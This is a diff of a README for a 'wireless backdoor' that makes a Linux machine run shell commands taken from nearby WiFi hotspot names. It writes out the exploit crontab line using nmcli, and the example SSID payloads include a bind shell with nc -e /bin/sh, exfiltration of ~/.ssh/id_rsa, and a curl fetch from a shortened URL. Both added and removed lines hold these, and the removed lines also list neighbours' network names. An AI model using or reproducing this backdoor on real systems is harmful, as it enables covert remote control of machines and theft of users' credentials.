@@ -1,48 +1,31 @@
-linux-native-backdoors
+Wireless backdoor
 ======================
 
-1. create a hotspot name such as:
-">curl -sL bit.ly/getouch"
+"*...List available WiFi access points.  iface and bssid options can be used to get just APs for particular interface or specific AP, respectively....*"
 
-2. (download and execute) now schedule your backdoor cron, at, ...
-bash -c "$(nmcli -f SSID dev wifi list | cut -f2 -d\' | egrep '^>' | cut -c2- | tail -n1)" | bash
+**Video**
 
-3. you can change your hotspot name to execute any remote command!
-">nc -e /bin/sh -l 2222"
-">nc 127.0.0.1 20 <~/.ssh/id_rsa"
-...
+<a href="http://www.youtube.com/watch?feature=player_embedded&v=I6kRJbxzcV4" target="_blank"><img src="http://img.youtube.com/vi/I6kRJbxzcV4/0.jpg" alt="Taking advantage of network-manager (nmcli backdoor)" width="480" height="360" border="10" /></a>
 
-refs:
-http://www.labofapenetrationtester.com/2014/08/Introducing-Gupt.html
+**Exploit**
+```shell-session
+
+echo "*/1 * * * * bash -c \"$(nmcli -f SSID dev wifi list | cut -f2 -d\' | egrep '^>' | cut -c2- | tail -n1)\"" | crontab
+
+```
+
+Now you can execute remote commands with your hotspot, create SSID names such as:
+>curl -sL bit.ly/getouch
+>nc -e /bin/sh -l 2222
+>nc 127.0.0.1 20 < ~/.ssh/id_rsa
+>xterm -display 127.0.0.1:1 &
+(...)
+
+
+**refs**
+
 http://www.wirelessforums.org/alt-internet-wireless/ssid-33892.html
 
-##### NetworkManager (non-priviledge)
-$ nmcli -t -f SIGNAL,SSID dev wifi list | sort -nr
-85:'padrao'
-52:'danger'
-35:'Lucas'
-30:'Privativac'
-25:'Virginia'
-20:'nelson munhoz'
-20:'C & B'
-19:'Leonardo'
-10:'wmfamwir'
-10:'maison'
-9:'RAMIRES'
-5:'MARCELO FARIA'
 
-
-##### iwlist (priviledge)
-##### TODO: fix regex
-$ sudo iwlist wlan0 scanning | xargs | egrep -o '(ESSID:([0-9a-zA-Z]+)|l=\-[0-9]+)' | xargs | sed 's/l=//g;s/ ESSID:/:/g' | xargs -n1 | sort -n
--95:MARCELO
--92:maison
--90:Leonardo
--90:wmfamwir
--87:nelson
--82:Lucas
--78:Virginia
--70:danger
--66:Privativac
--43:padrao
+You don't need any connectivity from your target to run commands on their behalf! Use carefully! ;-)
 
